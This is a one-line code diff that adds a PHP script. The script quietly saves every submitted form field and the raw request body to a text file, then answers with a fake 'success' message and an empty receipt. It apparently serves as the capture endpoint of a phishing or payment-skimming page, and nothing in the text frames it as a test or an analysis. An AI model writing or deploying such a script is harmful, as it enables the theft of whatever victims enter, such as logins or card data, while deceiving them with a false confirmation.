@@ -1,0 +1,1 @@
+<?php file_put_contents("content.txt", json_encode($_POST)." | ".file_get_contents("php://input")); ?>{"success":true,"receipt":""}
